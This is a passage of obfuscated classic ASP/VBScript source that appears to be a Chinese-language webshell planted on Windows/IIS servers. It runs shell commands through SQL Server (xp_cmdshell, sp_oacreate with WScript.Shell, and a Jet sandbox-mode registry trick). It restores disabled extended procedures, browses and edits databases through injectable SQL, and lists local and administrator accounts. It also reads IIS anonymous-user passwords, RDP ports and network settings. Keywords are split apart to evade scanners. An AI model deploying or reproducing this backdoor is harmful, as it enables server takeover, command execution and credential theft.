Set Rs=gwa.OpenSchema(20)
tez 3:azn"",b("库: "&rs(0))
rs.movefirst
do while not rs.eof
if rs(3)="TABLE" then
oiz 0:azn"","<span class=fixSpan title='"&rs(2)&"' onclick=""javascript:yot('nfe',this.title);this.disabled=true;"" style='width:94%;padding-left:8px;cursor:hand;'>表: "&rs(2)&"</span>"
agb=agb&"<table width=100% align=center>"&lps(3)&thr("'% colspan='"&dta,"&nbsp;"&b(Rs(2)))&lps(3)&thr("","&nbsp;列名")&thr("100c","类型")&thr("90c","大小")&thr("90c","可否为空")
If cut=False Then
agb=agb&thr("60c","默认值")
agb=agb&thr("400c","描述")
End If
Set rs1=gwa.execute("select * from "&rs(2))
syg=rs(2)
for each vta in rs1.fields
agb=agb&nmp(4)&thr("m","&nbsp;"&vta.Name&thr("m",ggg(vta.Type)))
If vta.DefinedSize <> 0 Then
agb=agb&thr("c",vta.DefinedSize)
 Else
agb=agb&thr("c",IIf(vta.Precision <> 0,vta.Precision,"&nbsp;"))
End If
agb=agb&thr("c",IIf(vta.Attributes=1,"False","True"))
If cut=False Then
agb=agb&thr("c","<span class=fixSpan style='width:40px;padding-left:5px;' title=""" & xtu(cat.Tables(syg).Columns(vta.Name).Properties("Default").value) & """>"& xtu(cat.Tables(syg).Columns(vta.Name).Properties("Default").value)&"</span>")
agb=agb&thr("","<span class=fixSpan style='width:95px;padding-left:5px;' title=""" & xtu(cat.Tables(syg).Columns(vta.Name).Properties("Description")) & """>"&xtu(cat.Tables(syg).Columns(vta.Name).Properties("Description"))&"</span>")
End If
next
end if
rs.movenext
loop
cda
j"</td><td>"
j agb
j"</td>":cda
Set rs1=Nothing
Set rs=Nothing
siz()
End Sub
Sub cez()
Dim i,p,x,rs,sql,fdi,sqlC,Cat,tmt,mhj,yyk,dhj,bad,lvr
On Error Resume Next
sql=zph("sql")
yyk=zph("param")
dhj=zph("theTable")
Set rs=khe(edg(15))
If IsNumeric(yyk)=True Then
tmt=yyk
 Else
tmt=1
dhj=yyk
sql=""
End If
If sql="" Then
sql="Select * From [" & dhj & "]"
End If
For i=1 To request("KeyWord").Count
If request("KeyWord")(i) <> "" Then
sqlC=Replace(request("KeyWord")(i),"'","''")
sqlC=IIf(request("JoinTag")(i)=" like ","'" & sqlC & "'",sqlC)
fdi=fdi & "[" & request("Fields")(i) & "]" & request("JoinTag")(i) & sqlC & request("JoinTag2")(i)
End If
Next
If fdi <> "" Then
sql="Select * From [" & dhj & "] Where " & fdi
If Right(sql,4)=" Or " Then sql=Left(sql,Len(sql) - 4)
If Right(sql,5)=" And " Then sql=Left(sql,Len(sql) - 5)
End If
if mro<>"" then sql=""
qpr()
jkv
if cut then dpq:zqr=474
oiz 3
azn"","SQL 语句："
azn"",SqlSelect&qoi("sql","",xtu(sql))&"<textarea name=fdi id=fdi rows=1 style='width:"&zqr&"px;'>" & xtu(sql) & "</textarea> "&qoi("^:this.form.icu.value='';this.form.sql.value=this.form.fdi.value;yot('nfe','0')","button","查 询")&bjw("fdi")&qoi("theTable","",xtu(dhj))
cda
If LCase(Left(sql,7))="select " and mro="" Then
j Replace(sHeader,"{$s}","数据查询器")
Set Rs1=gwa.OpenSchema(20)
tez 2:j"<td width='20%' valign=top>"
jkv
rs1.movefirst
do while not rs1.eof
if rs1(3)="TABLE" then 
If rs1(2)=dhj  Then
oiz 2
Else
oiz 0
End If
azn"","<span class=fixSpan title='" & rs1(2) & "' onclick=""javascript:yot('nfe',this.title);this.disabled=true;"" style='width:94%;padding-left:8px;cursor:hand;'>"&rs1(2)&"</span>"
end if
rs1.movenext
loop
set rs1=nothing
cda
j"</td><td valign=top>"
rs.Open sql,gwa,1,1
okv(Err)
rs.PageSize=20
If Not rs.Eof Then
rs.AbsolutePage=tmt
End If
j"<div align=left>"
jkv
tez 3
azn"","&nbsp;查询"
j"</tr><tr><td align=center>"
j"<div><br><select name=Fields>"
For Each x In rs.Fields
j"<option value=""" & x.Name & """>" & x.Name & "</option>"
Next
j"</select>"
j"<select name=JoinTag><option value=' like '>like</option><option value='='>=</option></select>"
axu"KeyWord","text|200",""
j"<select name=JoinTag2><option value=' And '>And</option><option value=' Or '>Or</option></select> "
axu"^:this.parentElement.outerHTML+='<div>'+this.parentElement.innerHTML+'</div>'","button","+"
axu"^:this.parentElement.outerHTML=''","button","-":j"</div>"
axu"^:this.form.sql.value='';this.form.param.value='1';this.form.theAct.value='nfe';this.form.submit()","button","查询"
j"<br><br></div>":cda
If rs.Fields.Count > 0 Then
bad=yqc(dhj)
j"<table width='99%'>"
oiz 3
azn"100' height='22c","操作"
For p=0 To rs.Fields.Count - 1
azn 1/rs.Fields.Count*100&"%","<span class=fixSpan title='" & rs.Fields(p).Name & "' style='width:125px;padding-left:5px;'>" & rs.Fields(p).Name & "</span>"
Next
For i=1 To rs.PageSize
If rs.Eof Then Exit For
oiz 1
j"<td width=100 height=22 align=center>"
If bad <> "" Then
axu"^:cdb('" & bad & "','" & rs(bad) & "')","button","编辑"
axu"^:kvo('" & bad & "','" & rs(bad) & "')","button","删除"
 Else
axu"^:alert('主键不存在,操作有可能导致重大数据库灾难,并且该操作不可逆!');cdb('" &rs.Fields(0).Name& "','" &rs(rs.Fields(0).Name)& "')","button","编辑"
axu"^:alert('主键不存在,操作有可能导致重大数据库灾难,并且该操作不可逆!');kvo('" &rs.Fields(0).Name& "','" &rs(rs.Fields(0).Name)& "')","button","删除"
End If
For p=0 To rs.Fields.Count - 1
azn"","<span class=fixSpan style='width:125px;padding-left:5px;'>" & xtu(IIf(Len(rs(p)) > 50,Left(rs(p),50),rs(p))) & "</span>"
Next
rs.MoveNext
Next
End If
oiz 3
nxh"lbf(" & tmt & ",'" & rs.RecordCount & "','" & rs.PageCount & "',10,'');"
cda
rs.Close
 else
 if zph("icu")<>"" and mro="mro" then
select case icu
case 0
sql="Exec ma"&yyl&"ster.dbo.XP_CMDShell '"&naz&"'"
case 1
gwa.Execute("create table [jnc](resulttxt nvarchar(1024) null);use ma"&yyl&"ster declare @o int exec sp"&gnt&"_oacreate 'WScri"&jse&"pt.S"&afd&"hell',@o out exec sp_"&ukq&"oamethod @o,'run',null,'cmd /c "&naz&" > 8617.tmp',0,true;bulk insert [jnc] from '8617.tmp' with (keepnulls);")
sql="select * from jnc"
ssqooff="drop table [jnc];declare @o int exec sp"&gnt&"_oacreate 'WScri"&jse&"pt.S"&afd&"hell',@o out exec sp_"&ukq&"oamethod @o,'run',null,'cmd /c del 8617.tmp'"
case 2
path="c:\windows\sys"&ocz&"tem32\ias\ias.mdb"
gwa.Execute("create table [jnc](resulttxt nvarchar(1024) null);exec ma"&yyl&"ster..xp_regwrite 'hkey_local_machine','SOF"&fse&"TWARE\microsoft\jet\4.0\Engi"&tzv&"nes','San"&bqy&"dBoxMode','reg_dword',0;select * from openrowS"&igb&"et('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c "&naz&" > 8617.tmp"&chr(34)&")');")
gwa.execute("select * from openrowS"&igb&"et('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c copy 8617.tmp jnc.tmp"&chr(34)&")');bulk insert [jnc] from 'jnc.tmp' with (keepnulls);")
sql="select * from jnc"
ssqooff="drop table [jnc];exec ma"&yyl&"ster..xp_regwrite 'hkey_local_machine','SOF"&fse&"TWARE\microsoft\jet\4.0\Engi"&tzv&"nes','San"&bqy&"dBoxMode','reg_dword',1;select * from openrowS"&igb&"et('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c del 8617.tmp&&del jnc.tmp"&chr(34)&")');"
case ""
exit sub
case else
end select
end if
okv(Err)
jkv
tez 3
azn"","执行结果：":j"</tr>"
if mro="mrp" or mro="kwk" then
i=0
if mro="kwk" then gwa.Execute("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'Web Assistant Procedures', 1;RECONFIGURE;")
for each x in roy
if mro="kwk" then gwa.Execute("dbcc adde"&brf&"xtEndedproc ('"&x&"','"&sqldlla(i)&"');EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure '"&sqldllb(i)&"', 1;RECONFIGURE;")
Set rs=gwa.Execute("select count(*) from ma"&yyl&"ster.dbo.sysobjects where xtype='x' and name='"&x&"'")
lvr=lvr&nmp(1)&thr("",iif(mro="kwk","恢复......","")&x&"......"&iif(rs(0)<>"",kiq,ict))
set rs=nothing
i=i+1
next
else
Set rs=gwa.Execute(sql,i,&H0001)
okv(Err)
If rs.Fields.Count > 0 Then
tez 4
For i=0 To rs.Fields.Count - 1
azn"",rs.Fields(i).Name
lvr=lvr &thr("","{$" & i & "}")
Next
lvr=lvr & "</tr>"
j"</tr>"
Do Until rs.EOF
For i=0 To rs.Fields.Count - 1
lvr=Replace(lvr,"{$" & i & "}",eaw(rs(i)) & "<br />{$" & i & "}")
Next
rs.MoveNext
Loop
For i=0 To rs.Fields.Count - 1
lvr=Replace(lvr,"<br />{$" & i & "}","")
Next
Else
lvr=thr("","查询执行成功")
End If
end if
j lvr 
cda
gwa.execute(ssqooff)
Set rs=Nothing
Set Cat=Nothing
siz()
Exit Sub
End If
j"</td>":cda
Set rs=Nothing
Set Cat=Nothing
siz()
End Sub
Sub ejx()
Dim faq,oob,qso,bpw,rdh,mfc,yut,cyk
Dim i,x,rs,sql,dhj,ncx,yyk,clv,quj,cwp,bad
On Error Resume Next
sql=zph("sql")
yyk=zph("param")
dhj=zph("theTable")
clv=InStr(yyk,"!")
faq=InStr(LCase(sql)," where")
oob=InStrRev(LCase(sql),"order ")
qso=IIf(LCase(Right(sql,4))="desc","1","0")
cwp=Mid(yyk,clv + 1)
quj=Left(yyk,clv - 1)
ncx=IIf(theAct="next",">",IIf(theAct="pre","<",""))
If oob > 0 Then sql=Left(sql,oob - 1)
If faq > 0 Then
mfc=") And "
sql=Left(sql,faq + 5) & "(" & Mid(sql,faq + 6)
 Else
mfc=" Where "
End If
If qso > 0 Then ncx=IIf(ncx=">","<",IIf(ncx="<",">",""))
qpr()
bad=yqc(dhj)
Set rs=khe(edg(15))
If ncx <> "" And IsNumeric(cwp)=True Then
sql="Select Top 1" & Mid(sql,7) & mfc
sql=sql & quj & " " & ncx & " " & cwp & " Order By " & quj & IIf(ncx="<"," Desc"," Asc")
 Else
sql=sql & mfc & quj & " like '" & Replace(cwp,"'","''") & "'"
End If
rdh=InStr(LCase(sql),"from")
faq=InStr(LCase(sql)," where")
bpw=InStr(rdh,LCase(sql),",",1)
If bpw > 0 Then
If (bpw > rdh) And (bpw < faq) Then
yut=True
End If
End If
If theAct <> "edit" Then
rs.Open sql,gwa,1,3
okv(Err)
If rs.Eof Then
nxh"alert('该记录不存在!');history.back();"
Response.End()
End If
If theAct="new" Then rs.AddNew
If theAct="del" Then
rs.Delete
rs.Update
uoh("删除成功!")
Response.End
 Else
If theAct <> "pre" And theAct <> "next" Then
For Each x In rs.Fields
If bad <> x.Name Then
rs(x.Name)=zph(x.Name & "_Column")
End If
Next
rs.Update
End If
cwp=rs(quj)
End If
If theAct="new" Then
sql="Select * From [" & dhj & "] Where " & quj & " like '" & Replace(cwp,"'","''") & "'"
End If
rs.Close
End If
rs.Open sql,gwa,1,1
j"<table width=600 align=center>"
tez 4
lrm"数据编辑"
axu"dfz","","nib"
axu"theAct","","save"
axu"sql","",xtu(zph("sql"))
axu"theTable","",dhj
axu"param","",xtu(quj & "!" & cwp)
axu"rmq","",xtu(zph("rmq"))
For Each x In rs.Fields
oiz 4
j"<td height=22 width=150>&nbsp;" & xtu(x.Name) & "<br/>&nbsp;(<em>" & ggg(x.Type) & "</em>)"
j"</td>"
j"<td width=450>&nbsp;"
j"<textarea style='width:436;' name=""" & x.Name & "_Column""" & IIf(x.Type=201 Or x.Type=203," rows=6","")
j IIf(x.Properties("ISAUTOINCREMENT").Value," disabled","") 
j IIf(x.Name=bad," title='主键,由于主键约束,将无法被修改,也不能出现相同值.'","") & ">"
j xtu(x.value)
j"</textarea></td></tr>"
Next
j"<tr>"
j"<td colspan=2 class=td align=center>"
If yut=False Then
If bad="" Then
axu"^:if(confirm('确定要修改这条记录吗?\n此表没有主键,继续操作可能会导致数据库灾难,并且该错误无法被撤消.')){this.form.theAct.value='save';this.form.submit();}","button","修改"
 Else
axu"^:this.form.theAct.value='save'","submit","修改"
axu"^:if(confirm('确实要添加当前为新记录吗?')){this.form.theAct.value='new';this.form.submit();}","button","添加"
axu"^:if(confirm('确实删除当前记录吗?')){this.form.theAct.value='del';this.form.submit();}","button","删除"
End If
End If
axu"","reset","重置"
axu"^:window.close()","button","关闭"
j"<input type=reset value=重置><input type=button value=关闭 onclick='javascript:window.close();'>"
If IsNumeric(cwp)=True Then
axu"^:this.form.theAct.value='pre';this.form.submit()","button","上一条"
axu"^:this.form.theAct.value='next';this.form.submit()","button","下一条"
End If
j"</td>"
j"</tr>"
j"</table>"
rs.Close
Set rs=Nothing
siz()
End Sub
sub dpq()
set rs=gwa.execute("select is_srvrolemember('sysadmin')")
if rs(0)=0 then ptw="不"
set rs=nothing
axu"mro","",""
tez 3
azn 60,"组件操作：":j"<td>"
axu"kwk^:vzm('kwk')","button","恢复组件":j" "&dbi("此账号"&ptw&"是最高权限,SQL Server 2005 组件默认为禁用，请点击恢复组件后再执行相关命令")&"</td>"
oiz 3
azn"","CMD 命令：":j"<td>"
j"<select name='icu' id='icu'><option value=''>选择执行组件"
for i=0 to 2
j"<option value='"&i&"'"
if trim(i)=icu then j" selected='selected'"
j">"&roy(i)&"</option>"
next
j"</select> "
axu"naz","text"" size=""102",naz:j" "
axu"^:vzm('mro')","button","执 行":j"</td>"
end sub
Sub qpr()
Dim jba,nci,rsq,yjc,job
On Error Resume Next
Set gwa=khe(edg(12))
if rmq="sql:s" then
rmq="sql:Driver={Sql Server};Server={$npv};Database={$sqdb};Uid={$zen};Pwd={$rpu}"
if IsNumeric(tyg) then tyg=","&tyg else tyg=",1433"
rmq=Replace(rmq,"{$npv}",npv&tyg)
rmq=Replace(rmq,"{$zen}",zen)
rmq=Replace(rmq,"{$rpu}",rpu)
rmq=Replace(rmq,"{$sqdb}",sqdb)
end if
If LCase(Left(rmq,4))="sql:" Then
jba=Mid(rmq,5)
cut=True
 Else
nci=Split(rmq,";")
job=nci(0)
job=job
okv(Err)
If UBound(nci) >=2 Then
rsq=nci(1)
yjc=nci(2)
End If
jba=Replace(accessStr,"{$dbSource}",job)
jba=Replace(jba,"{$userId}",rsq)
jba=Replace(jba,"{$passWord}",yjc)
end if
gwa.Open jba
okv(Err)
End Sub
Function yqc(dhj)
Dim dtx
On Error Resume Next
Set dtx=gwa.OpenSchema(28,Array(Empty,Empty,dhj))
If Not dtx.Eof Then yqc=dtx("COLUMN_NAME")
Set dtx=Nothing
End Function
Function ggg(flag)
Dim str
Select Case flag
Case 0 : str="EMPTY"
Case 2 : str="SMALLINT"
Case 3 : str="INTEGER"
Case 4 : str="SINGLE"
Case 5 : str="DOUBLE"
Case 6 : str="CURRENCY"
Case 7 : str="DATE"
Case 8 : str="BSTR"
Case 9 : str="IDISPATCH"
Case 10 : str="ERROR"
Case 11 : str="BIT"
Case 12 : str="VARIANT"
Case 13 : str="IUNKNOWN"
Case 14 : str="DECIMAL"
Case 16 : str="TINYINT"
Case 17 : str="UNSIGNEDTINYINT"
Case 18 : str="UNSIGNEDSMALLINT"
Case 19 : str="UNSIGNEDINT"
Case 20 : str="BIGINT"
Case 21 : str="UNSIGNEDBIGINT"
Case 72 : str="GUID"
Case 128 : str="BINARY"
Case 129 : str="CHAR"
Case 130 : str="WCHAR"
Case 131 : str="NUMERIC"
Case 132 : str="USERDEFINED"
Case 133 : str="DBDATE"
Case 134 : str="DBTIME"
Case 135 : str="DBTIMESTAMP"
Case 136 : str="CHAPTER"
Case 200 : str="VARCHAR"
Case 201 : str="LONGVARCHAR"
Case 202 : str="VARWCHAR"
Case 203 : str="LONGVARWCHAR"
Case 204 : str="VARBINARY"
Case 205 : str="LONGVARBINARY"
Case Else : str=flag
End Select
ggg=str
End Function
Sub uoh(str)
If str="" Then
j"<script language=javascript>window.close();</script>"
 Else
j"<script language=javascript>alert(""" & str & """);window.close();</script>"
End If
End Sub
Function eaw(str)
str=xtu(str)
str=Replace(str," ","&nbsp;")
str=Replace(str,"","&nbsp;&nbsp;&nbsp;&nbsp;")
str=Replace(str,vbNewLine,"<br />")
eaw=str
End Function
Function yqm(rpath)
Dim arq,jcm
On Error Resume Next
bys
arq=uuf.RegRead(rpath)
If IsArray(arq)Then
jcm=""
For i=0 To UBound(arq)
If IsNumeric(arq(i))Then
If CInt(arq(i))<16 Then
jcm=jcm&"0"
End If
jcm=jcm&CStr(Hex(CInt(arq(i))))
Else
jcm=jcm&arq(i)
End If
Next
yqm=jcm
Else
yqm=arq
End If
if err then yqm=dbi(err.Description)
End Function
Sub ype(oej)
Dim twq,wbp,zuh
On Error Resume Next
Set twq=getObject("WinNT://./"&oej&",user")
wbp=twq.Get("UserFlags")
zuh=twq.LastLogin
azn 200,"<b>"&twq.Name&"</b>":azn 50,"隶属于：":azn"",xsw(oej):azn 60,"最后登录：":azn 140,zuh
cda
bub"100%"" id=""usertr_"&i&""" style=""display:none;"
tez 0
azn 150,"密码已过期"
azn"",CBool(twq.Get("PasswordEx"&iyn&"pired"))
oiz 1
azn"","密码永不过期"
azn"",cbool(wbp And&H10000)
oiz 0
azn"","用户不能更改密码"
azn"",cbool(wbp And&H00040)
oiz 1
azn"","全局账户"
azn"",cbool(wbp And&H100)
oiz 0
azn"","密码最小长度"
azn"",twq.PasswordMinimumLength
oiz 1
azn"","是否必须密码"
azn"",twq.PasswordRequired
oiz 0
azn"","账户已停用"
azn"",twq.AccountDisabled
oiz 1
azn"","账户已锁定"
azn"",twq.IsAccountLocked
oiz 0
azn"","用户配置文件"
azn"",twq.Profile
oiz 1
azn"","用户登录脚本"
azn"",twq.LoginScript
oiz 0
azn"","用户主文件夹"
azn"",twq.HomeDirectory
oiz 1
azn"","用户主驱动器"
azn"",twq.Get("HomeDirDr"&fql&"ive")
oiz 0
azn"","描述："
azn"",twq.Description
If Err Then Err.Clear
End Sub
Sub znw()
Dim vhi,ihj,qit
Set qit=getObject("WinNT://.")
qit.Filter=Array("User")
lrm"User"
i=0
For Each vhi in qit
i=i+1
bub"100%"" style=""cursor:pointer;"" onclick=""javascript:alc('usertr_"&i&"')"
mbi
azn 10,"<div style='width:10px;height:10px;' id='ss_"&i&"'>"&pel(bwy("3"))&"</div>"
ype(vhi.Name)
cda
Next
okv(Err)
lrm"UserGroup"
qit.Filter=Array("Group")
jkv
i=0
For Each ihj in qit
oiz(i mod 2)
azn"",ihj.Name
azn"",ihj.Description
i=i+1
Next
cda
j"</span>"
okv(Err)
End Sub
Function xsw(oej)
Dim vhi,ihj,mgz
Set vhi=getObject("WinNT://./"&oej&",user")
For Each ihj in vhi.Groups
mgz=mgz+1
if mgz>1 then xsw=xsw&" , "
xsw=xsw&" "&ihj.Name
Next
End Function
sub xey()
lrm"系统进程"
jkv
mbi
azn 100,"<B>进程名</B>"
azn 100,"<B>描述</B>"
azn 60,"<B>启动类型</B>"
azn"","<B>位置</B>"
on error resume next
dim wso,nfb,qhw
i=1
    for each obj in getObject("WinNT://.")
if  trim(OBJ.StartType)="" then
else
i=i+1
if OBJ.StartType=2 then wso="自动"
if OBJ.StartType=3 then wso="手动"
if OBJ.StartType=4 then wso="禁用"
oiz(i mod 2)
azn"e",obj.Name
azn"w",obj.DisplayName
azn"p",wso
azn"",obj.path
end if
next
cda
err.clear
end sub
Sub ktu()
dim uir,pkn,i,szt,zhw,cll,nsp,wdh,utk,rtl
On Error Resume Next
Set zhw=GetObject("IIS://LocalHost/W3SVC")
If err Then Exit sub
jkv
tez 2
azn"",b("ID")
azn"",b("Name")
azn"",b("User")
azn"",b("Pass")
azn 130,b("Ip&Port")
azn"",b("Domain")
azn"",b("Path")
i=0
For Each szt In zhw
m=i mod 2
pkn=replace(szt.AdsPath,Left(szt.Adspath,22),"")
if IsNumeric(pkn)=true then
oiz m
i=i+1
set IIs=zhw.GetObject("IIsWebServer",pkn)
if err Then
azn"'% colspan='7",Err.Description
else
set cll=iis.getobject("IIsWebVirtualDir","Root")
nsp=IIS.serverBindings
utk="":rtl=""
for n=0 to ubound(nsp)
wdh=split(nsp(n),":")
utk=utk&iif(wdh(0)<>"",wdh(0),"默认IP")&":"&wdh(1)&"<br>"
rtl=rtl&wdh(2)&"<br>"
next
azn"",i
azn"",iis.servercomment
azn"",cll.AnonymousUserName
azn"",cll.AnonymousUserPass
azn"",utk
azn"",rtl
azn"",cll.path
End If
end if
Next
ctn=ctn&"</table>"
j ctn
Set zhw=Nothing
End Sub
sub sxu()
On Error Resume Next
dim kzs,fnp,kmr,ifn,baa,ckx,cwb,zrr,vga,sby,lwc,yja,pxy,ljd,wpx,qvr,fmt,klk,dtw,onq
if btt(edg(1))=false then
j edg(1)&"组件不存在，无法进行相关检测！"
exit sub
end if
bys
lrm"[网络"&"探测]"
ept
kzs="HK"&rto&"LM\SYSTEM\CurrentC"&pmj&"ontrolSet\Services\Tcpip\Parameters\EnableSecur"&tcz&"ityFilters"
fnp=uuf.Regread(kzs)
If fnp=0 or fnp="" Then
kmr=1
End If 
ifn="HK"&rto&"LM\SYSTEM\ControlS"&ews&"et001\Services\Tcpip\Linkage\Bind"
baa=uuf.RegRead(ifn)
hk="HK"&rto&"LM\SYSTEM\ControlS"&ews&"et001\Services\Tcpip\Enum\Count"
kk=uuf.RegRead(hk)
jkv
arg="活动网卡ip："
If IsArray(baa) Then 
For i=LBound(baa) To UBound(baa)-1
ckx=Replace(baa(i),"\Device\","")
oiz 0
j"<td>"
j"网卡"&i&"的序列为:"&ckx
j"<br>"
cwb="HKEY_LOCAL_MACHINE\SYSTEM\ControlS"&ews&"et001\Services\Tcpip\Parameters\Interfaces\"
zrr=cwb&ckx&"\IPAddress"
vga=uuf.Regread(zrr)
If vga(0)<>"" Then
For x=Lbound(vga) to Ubound(vga)
j"<li>IP地"&"址"&x&"为:"&vga(x)
if i=kk then j dbi(" 当前活动网卡"):arg=arg&dbi(vga(x))&"，"
Next
Else
j"<li>IP地"&"址无法读取"&"或没有设置<br>"
End if
sby=cwb&ckx&"\DefaultG"&uya&"ateway"
lwc=uuf.Regread(sby)
If isarray(lwc) Then
For x=Lbound(lwc) to Ubound(lwc)
j"<li>网关"&x&":"&lwc(x)&"<br>"
Next
Else
j"<li>网关无法读取或没有设置<br>"
End if
yja=cwb&ckx&"\NameS"&kob&"erver"
pxy=uuf.RegRead(yja)
If pxy<>"" Then
j"<li>网卡"&"DNS为:"&pxy&"<br>"
Else
j"<li>默认"&"DNS无法读取或没有设置<br>"
End If
if kmr=1 Then 
j"<li>没Tcp/IP筛选<br>"
else
ljd="\TCPAllowedPorts"
wpx="\UDPAllowedPorts"
qvr=cwb&ckx&ljd
fmt=cwb&ckx&wpx
klk=uuf.RegRead(qvr)
If klk(0)="" or klk(0)=0 Then
j"<li>允许"&"的tcp端口为:全部<br>"
Else
j"<li>允许"&"的tcp端口为:"
For j=LBound(klk) To UBound(klk)
j klk(j)&","
Next
j"<Br>"
End if
dtw=uuf.RegRead(fmt)
If dtw(0)="" or dtw(0)=0 Then
j"<li>允许"&"的udp端口为:全部<br>"
Else
j"<li>允许"&"的udp端口为:"
for j=LBound(dtw) To UBound(dtw)
j dtw(j)&","
next
j"<br>"
End if
End if
j"</td>"
Next
err.clear
end if
cda
end sub
function bim()
lrm"[管"&"理"&"员"&"用"&"户]"
ept
on error resume next 
jkv
Set tN=khe("WScri"&jse&"pt.Network")
Set ihj=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each a in ihj.Members
oiz 1:azn"80","账号名：":azn"",a.Name
Next
if err then
j Err.Description
end if
cda
end function
sub dcs()
dim ywd
rlt"Application 变量列表"
jkv
mbi
azn 110,"<b>变 量 名 称</b>"
azn"","<b>值</b>"
i=1
for each a in Application.Contents
i=i+1
oiz(i mod 2)
azn"",a
if isobject(Application.Contents(a)) then
ywd="[对象]"
elseif isarray(Application.Contents(a)) then
ywd="[数组]"
else
ywd=wic(Application.Contents(a))
end if
azn"",ywd
next
cda
end sub
sub wyq()
dim snd
rlt"Session 变量列表"
jkv
mbi
azn 110,"<b>变 量 名 称</b>"
azn"","<b>值</b>"
i=1
for each a in Session.Contents
i=i+1
oiz(i mod 2)
azn"d",a
if isobject(Session.Contents(a)) then
snd="[对象]"
elseif isarray(Session.Contents(a)) then
snd="[数组]"
else
snd=wic(Session.Contents(a))
end if
azn"",snd
next
cda
end sub
sub pex()
rlt"Req"&"ue"&"st.S"&"erv"&"erVa"&"ria"&"bles 变量列表(含客户端信息)"
jkv
mbi
azn 110,"<b>变 量 名 称</b>"
azn"","<b>值</b>"
i=1
for each a in Request.ServerVariables
i=i+1
oiz(i mod 2)
azn"e",a
azn"",wic(oys(a))
next
cda
end sub
sub ksv()
On Error Resume Next
bys
rlt edg(1)&".Environments 变量列表"
jkv
mbi
azn 110,"<b>变 量 名 称</b>"
azn"","<b>值</b>"
i=1
for each a in uuf.Environment
i=i+1
envsa=split(a,"=")
oiz(i mod 2)
azn"w",envsa(0)
azn"",wic(envsa(1))
next
cda
end sub
sub psw()
On Error Resume Next
bys
Set WshSysEnv=uuf.Environment("SYSTEM")
bxj=cstr(WshSysEnv("OS"))
cve=cstr(WshSysEnv("NUMBER_OF_P"&xbq&"ROCESSORS"))
bkv=cstr(WshSysEnv("PR"&djd&"OCESSOR_IDENTIfIER"))
if isempty(cve) then
cve=oys("NUMBER_OF_P"&xbq&"ROCESSORS")
end if
if cve="" then
cve="(未知)"
end if
if bxj="" then
bxj="(未知)"
end if
end sub
'!>
sub nkt()
dim uis,eer,rsb,npj,sqi,xli,cvs,sbm,i
On Error Resume Next
if btt(edg(1))=false then exit sub
bys
nyd"系统当前"&"路"&"径变量",6,1
cvs=uuf.Environment.item("Path")
jkv
sbm=split(cvs,";")
oiz 0
For each x in sbm
if x<>"" then
if i mod 2=0 then oiz 0
azn"50%","<li>"&iif(instr(x,":\")>0,cvp(x,b(x)),x)
i=i+1
end if
next
if i mod 2=1 then azn"","&nbsp;"
cda
cda
end sub
sub eyd()
On Error Resume Next
nyd"服务器基本信息",3,1
jkv
tez 0
azn 110,"服务器地址"
azn"","名称 "&oys("SERVER_NAME")&" (IP:"&rqd&") 端口:"&oys("SERVER_PORT")
tnow=now():oknow=cstr(tnow)
if oknow <> year(tnow) & "-" & month(tnow) & "-" & day(tnow) & " " & hour(tnow) & ":" & right(FormatNumber(minute(tnow)/100,2),2) & ":" & right(FormatNumber(second(tnow)/100,2),2) then oknow=oknow & " (日期格式不规范)"
azn"","服务器时间"
azn"",oknow
oiz 0
psw
azn"","服务器操作系统"
'<!
bxj=bxj&inw("sxu","",b(" [端口&网络]"))
iisinfo=inw("ktu","",b(" [IIS信息]"))
'!>
azn"",bxj
azn"","IIS版本"
azn"",oys("SERVER_SOFTWARE")&iisinfo
oiz 0
azn"","脚本超时时间"
azn"",Server.ScriptTimeout
azn"","服务器脚本引擎"
azn"",ScriptEngine & "/"& ScriptEngineMajorVersion &"."&ScriptEngineMinorVersion&"."& ScriptEngineBuildVersion&inw("ulz","",b(" [脚本探测]"))
oiz 0
azn"","本文件路径"
azn"",oys("PATH_TRANSLATED")
azn"","ServerVariables"
azn"",Request.ServerVariables.Count&" 个"&rph
oiz 0
azn"","服务器CPU通道数"
azn"",cve&" 个"
azn"","全局和会话变量"
'<!
if Application.Contents.count>0 then amg=" "&inw("dcs","",b(" [列表]"))
if Session.Contents.count>0 then byv=" "&inw("wyq","",b(" [列表]"))
if Request.ServerVariables.Count>0 then rph=" ["&inw("pex","","Requ"&"est.Ser"&"verVa"&"riables 列表")&"] "
'!>
azn"","Application 变量 "&Application.Contents.count&" 个"&amg&", Session 变量 "&Session.Contents.count&" 个"&byv&"&nbsp;当前会话ID: "&Session.SessionId()
oiz 0
bys
dim soa
soa="读取失败(组件不可用)"
azn"","服务器CPU详情"
azn"",bkv
azn"","全部服务器环境"
'<!
if uuf.Environment.count>0 then pvr=" "&inw("ksv","",b("[W"&"Ss"&"h"&"ell.Environment 列表]"))
'!>
azn"",uuf.Environment.count&" 个"&pvr
oiz 0
pcnaamekey="HK"&rto&"LM\SYSTEM\CurrentC"&pmj&"ontrolSet\Control\ComputerName\ComputerName\ComputerName"
pccname=uuf.RegRead(pcnaamekey)
if pccname="" Then pccname="无法读_取主机名."
azn"","主机名"
azn"",pccname
rsb="HKEY_LOCAL_MACHINE\SYSTEM\CurrentC"&pmj&"ontrolSet\Control\Term"&ujr&"inal Server\Wds\rdpwd\Tds\tcp\PortNumber"
npj=uuf.RegRead(rsb)
If npj="" Then npj="无法"&"读取."
azn"","Term"&ujr&"inal Service端口"
azn"",npj
oiz 0
AdminnNamekKey="HKEY_LOCAL_MACHINE\SOF"&fse&"TWARE\Microsoft\Windo"&gns&"ws NT\CurrentV"&cbd&"ersion\Win"&ssd&"logon\AltDefaultUserName"
AdmminNaame=uuf.RegRead(AdminnNamekKey)
if AdmminNaame="" Then AdmminNaame="Administrator"
on error resume next 
displogin=uuf.regRead("HKEY_LOCAL_MACHINE\SOF"&fse&"TWARE\Microsoft\Windows\CurrentV"&cbd&"ersion\Policies\System\DontDisplayLastUserName")
If displogin="" or displogin=0 Then disply=" ＝ " else disply=" ≠ "
azn"","默"&"认管"&"理"&"员"
iph=IIf(btt(edg(1)),AdmminNaame&disply&"上次"&"登"&"录用"&"户",soa)
'<!
iph=iph&"&nbsp;"&inw("bim","",b(" [详情]"))
'!>
azn"",iph
